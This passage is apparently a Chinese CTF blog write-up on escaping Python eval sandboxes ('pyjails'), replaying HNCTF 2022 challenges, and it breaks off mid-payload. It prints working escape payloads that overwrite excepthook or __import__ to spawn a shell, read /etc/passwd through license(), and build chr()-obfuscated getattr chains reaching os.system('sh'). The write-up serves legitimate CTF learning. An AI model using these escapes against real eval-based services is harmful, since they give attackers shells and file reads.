<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c</span>):</span><br><span class="line">        <span class="variable language_">self</span> += <span class="string">&quot;os.system(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span></span><br><span class="line">sys.excepthook = X</span><br><span class="line"><span class="number">1</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>():</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, e</span>):</span><br><span class="line">    <span class="variable language_">self</span> += <span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br><span class="line">  __iadd__ = <span class="built_in">eval</span></span><br><span class="line">__builtins__.<span class="built_in">__import__</span> = X</span><br><span class="line"><span class="comment"># &#123;&#125;[1337]</span></span><br></pre></td></tr></table></figure>
<p>这个 payload 将 <strong>import</strong> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <strong>import</strong>.</p>
<h4 id="通过-license-函数读取文件">通过 license 函数读取文件</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用 license() 时会打印这个文件的内容.</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames</span><br><span class="line">[<span class="string">&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/../LICENSE&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE&#x27;</span>, <span class="string">&#x27;./LICENSE.txt&#x27;</span>, <span class="string">&#x27;./LICENSE&#x27;</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">payload 中将 <span class="built_in">help</span> 类的 __enter__ 方法覆盖为 license 方法, 而 <span class="keyword">with</span> 语句在创建上下文时会调用 <span class="built_in">help</span> 的__enter__, 从而执行 license 方法. 这里的 <span class="built_in">help</span> 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的</span><br></pre></td></tr></table></figure>
<p>例如:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContext</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>其他绕过技巧</p>
<h4 id="模拟-no-builitins-环境">模拟 no builitins 环境</h4>
<p>no builtins 环境和 python 交互式解析器还是有所差异, 但交互式解析器并没有提供指定命名空间的功能,因此可以自己编写一个脚本进行模拟:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    global_namespace = &#123;&#125;</span><br><span class="line">    local_namespace = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Try to eval the code first.</span></span><br><span class="line">            result = <span class="built_in">eval</span>(code, global_namespace, local_namespace)</span><br><span class="line">        <span class="keyword">except</span> SyntaxError:</span><br><span class="line">            <span class="comment"># If a SyntaxError occurs, this might be because the user entered a statement,</span></span><br><span class="line">            <span class="comment"># in which case we should use exec.</span></span><br><span class="line">            <span class="built_in">exec</span>(code, global_namespace, local_namespace)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    repl() </span><br></pre></td></tr></table></figure>
<h3 id="HNCTF-2022-Pyjail题目复现">HNCTF 2022 Pyjail题目复现</h3>
<h4 id="calc-jail-beginner">calc_jail_beginner</h4>
<p>It’s an great way to learn an python jail from these challenge!</p>
<p>Let’s play it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Your goal is to read ./flag.txt</span></span><br><span class="line"><span class="comment">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _     ______      _                              _       _ _ </span></span><br><span class="line"><span class="string"> | |   |  ____|    (_)                            | |     (_) |</span></span><br><span class="line"><span class="string"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span></span><br><span class="line"><span class="string"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span></span><br><span class="line"><span class="string"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span></span><br><span class="line"><span class="string"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span></span><br><span class="line"><span class="string">               __/ |                                           </span></span><br><span class="line"><span class="string">              |___/                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>注意到这里用到了一个<code>eval(input_data)</code>，这个函数会将我们的输入转换并且执行python代码（类似的有<code>exec()</code>）。</p>
<p>这NSSCTF部署的题目复现根据提示去打payload并没有找到题目所说的flag，直接ls查看一下文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  _     ______      _                              _       _ _</span><br><span class="line"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="line"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="line"> | <span class="string">&#x27;_ \|  __| / _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|  _   | |/ _` | | |</span><br><span class="line"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="line"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="line">               __/ |</span><br><span class="line">              |___/</span><br><span class="line"></span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; __import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">ls</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">flag  server.py</span></span><br><span class="line"><span class="string">Answer: 0</span></span><br></pre></td></tr></table></figure>
<p>发现flag文件就叫flag，那么可以构造以下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">plaintext</span><br><span class="line">&gt; <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">flag=NSSCTF&#123;0ff598a9-c835-4c4c-b113-35b0b476d239&#125;</span><br><span class="line"></span><br><span class="line">Answer: <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level1">calc_jail_beginner_level1</h4>
<p>you finish beginner challenge.Let’s play an challenge of easy calc</p>
<p>It seems have some filter than beginner challenge. can u escape it?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#the function of filter will banned some string &#x27;,&quot;,i,b</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ __ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | /_ |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                  </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                      </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>还是类似的题目，但是多了一个过滤：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure>
<p>不能包含双引号单引号反引号、还有字母i和b。所以<code>import</code>和<code>bytes</code>就不能用了。</p>
<p>在RCE中，首先使用Show subclasses with tuple起手：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>这种操作可以得到tuple所属类的直接基类的所有子类，事实上，根据我们之前得到的特性，这里我们求得的<code>().__class__.__base__</code>其实就是<code>&lt;class 'object'&gt;</code>，所以求得是object类的所有子类。</p>
<p>但是我们不能出现字母b，可以使用getattr函数替代<code>__base__</code>：</p>
<blockquote>
<p>使用方法大致可以抽象为<code>getattr(A,'B')</code>等价于<code>A.B</code>，同样的：<code>getattr(A,'B')()</code>等价于<code>A.B()</code>。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(().__class__, <span class="string">&#x27;__base__&#x27;</span>).__subclasses__()</span><br></pre></td></tr></table></figure>
<p>转成字符串之后，由于不让出现引号，可以进一步转换成用<code>chr</code>加和表示字符串的形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(().__class__, <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)).__subclasses__()</span><br></pre></td></tr></table></figure>
<p>同样的方法可以改后面的<code>__subclasses__()</code>，得到payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(().__class__,<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)),<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()</span><br><span class="line">plaintext</span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</span></span><br><span class="line"><span class="string">Answer: [&lt;class &#x27;</span><span class="built_in">type</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">int</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>bytearray_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">bytearray</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>bytes_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">bytes</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>builtin_function_or_method<span class="string">&#x27;&gt;, &lt;class &#x27;</span>callable_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>PyCapsule<span class="string">&#x27;&gt;, &lt;class &#x27;</span>cell<span class="string">&#x27;&gt;, &lt;class &#x27;</span>classmethod_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">classmethod</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>code<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">complex</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>coroutine<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_items<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_itemiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_keyiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_valueiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_keys<span class="string">&#x27;&gt;, &lt;class &#x27;</span>mappingproxy<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_reverseitemiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_reversekeyiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_reversevalueiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_values<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">dict</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>ellipsis<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">enumerate</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">float</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>frame<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">frozenset</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>function<span class="string">&#x27;&gt;, &lt;class &#x27;</span>generato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>getset_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>instancemethod<span class="string">&#x27;&gt;, &lt;class &#x27;</span>list_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>list_reverseiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">list</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>longrange_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>member_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">memoryview</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>method_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>method<span class="string">&#x27;&gt;, &lt;class &#x27;</span>modulede<span class="string">f&#x27;&gt;, &lt;class &#x27;</span>module<span class="string">&#x27;&gt;, &lt;class &#x27;</span>odict_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>pickle.PickleBuffe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">property</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>range_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">range</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">reversed</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>symtable entry<span class="string">&#x27;&gt;, &lt;class &#x27;</span>iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>set_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">set</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">slice</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">staticmethod</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>stderrprinte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>supe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>traceback<span class="string">&#x27;&gt;, &lt;class &#x27;</span>tuple_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">tuple</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>str_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>st<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>wrapper_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>types.GenericAlias<span class="string">&#x27;&gt;, &lt;class &#x27;</span>anext_awaitable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generator_asend<span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generator_athrow<span class="string">&#x27;&gt;, &lt;class &#x27;</span>async_generator_wrapped_value<span class="string">&#x27;&gt;, &lt;class &#x27;</span>coroutine_wrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>InterpreterID<span class="string">&#x27;&gt;, &lt;class &#x27;</span>managedbuffe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>method-wrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>types.SimpleNamespace<span class="string">&#x27;&gt;, &lt;class &#x27;</span>NoneType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>NotImplementedType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.CallableProxyType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.ProxyType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.ReferenceType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>types.UnionType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>EncodingMap<span class="string">&#x27;&gt;, &lt;class &#x27;</span>fieldnameiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>formatteriterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>BaseException<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_array_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_bitmap_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_collision_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>keys<span class="string">&#x27;&gt;, &lt;class &#x27;</span>values<span class="string">&#x27;&gt;, &lt;class &#x27;</span>items<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_contextvars.Context<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_contextvars.ContextVa<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_contextvars.Token<span class="string">&#x27;&gt;, &lt;class &#x27;</span>Token.MISSING<span class="string">&#x27;&gt;, &lt;class &#x27;</span>filte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">map</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">zip</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ModuleLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._DummyModuleLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ModuleLockManage<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.ModuleSpec<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.BuiltinImporte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.FrozenImporte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ImportLockContext<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread.lock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread.RLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread._localdummy<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread._local<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_io._IOBase<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_io._BytesIOBuffe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_io.IncrementalNewlineDecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>posix.ScandirIterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>posix.DirEntry<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.WindowsRegistryFinde<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external._LoaderBasics<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.FileLoade<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external._NamespacePath<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external._NamespaceLoade<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.PathFinde<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib_external.FileFinde<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.Codec<span class="string">&#x27;&gt;, &lt;class &#x27;</span>codecs.IncrementalEncode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.IncrementalDecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.StreamReaderWrite<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.StreamRecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_abc._abc_data<span class="string">&#x27;&gt;, &lt;class &#x27;</span>abc.ABC<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Hashable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Awaitable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.AsyncIterable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Iterable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Sized<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Containe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>collections.abc.<span class="type">Callable</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>os._wrap_close<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_sitebuiltins.Quitte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_sitebuiltins._Printe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_sitebuiltins._Helpe<span class="string">r&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>
<p>在得到的这么多子类中找到了<code> &lt;class 'os._wrap_close'&gt;</code>，下一步就是利用这个子类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>.__init__</code> 获取所选子类的构造函数 <code>__init__</code> 方法。</p>
<p><code>.__globals__</code> 获取 <code>__init__</code> 方法的全局命名空间，这通常<strong>包含了可用的所有全局变量和函数</strong>。</p>
</blockquote>
<p>同样用<code>getattr</code>绕过<code>__init__</code>和<code>__globals__</code>，以及改写字符串操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(().__class__,chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">98</span>)+chr(<span class="number">97</span>)+chr(<span class="number">115</span>)+chr(<span class="number">101</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br><span class="line">plaintext</span><br><span class="line">Enter your expression and I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">&gt; getattr(getattr(getattr(getattr(().__class__,chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">98</span>)+chr(<span class="number">97</span>)+chr(<span class="number">115</span>)+chr(<span class="number">101</span>)+chr(<span class="number">95</span>)+chr(<span 